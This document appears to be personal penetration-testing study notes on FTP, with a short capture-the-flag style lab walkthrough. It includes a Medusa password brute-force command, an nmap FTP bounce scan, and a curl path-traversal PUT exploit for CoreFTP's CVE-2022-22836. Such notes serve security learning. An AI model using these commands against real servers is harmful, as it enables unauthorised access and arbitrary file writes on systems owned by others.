# Basic Information
See the enumerating notes of FTP for the enumeration
Using NMAP and the -sC is for the scripting and has the ftp-anon log on enabled

`get` will allow you to grab 1 file and `mget` will allow you to grab multiple
`put` will allow you to place a file there and `mput` for multiple

# Tools
### Medusa
`medusa -u user -P /usr/share/wordlists/rockyou.txt -h 10.10.10.10 -M ftp`

### FTF Bounce Attack
Basically trying to get the server to run commands from the outside
Using the `-b` option in the `nmap` command will allow for this to happen if it can
`nmap -Pn -v -n -p80 -b anonymous:password@10.10.10.10 172.17.0.2`

# Mini Lab (10.129.203.6)
What port is the FTP service running on?
`nmap 10.129.203.6 -sC -sV`
This gave the output of the machine and the port of 2121

 What username is available for the FTP server
 ![725b6e296615d954c1ccc9ab4fac6b9e.png](:/27d707f82bbf421e9ea6e40c877e2889)
 After being able to connect I was able to capture a file and cat it outside of the environment
 The answer was `robin`

 Using the credentials obtained earlier, retrieve the flag.txt file. Submit the contents as your answer.
 Just using simple `cat` on the password file was able to grab the file

 # More vulns for FTP
 This Vuln did correctly process the HTTP PT request and leads to an arbitrary file write vuln [CoreFTP before build 727](nvd.nist.gov/vuln/detail/CVE-2022-22836)
 `curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops`
 ![c70812767a43978cbd0a2b4e45b9f10a.png](:/1af64818c6e84bb78c23a3daab7c7f23)
 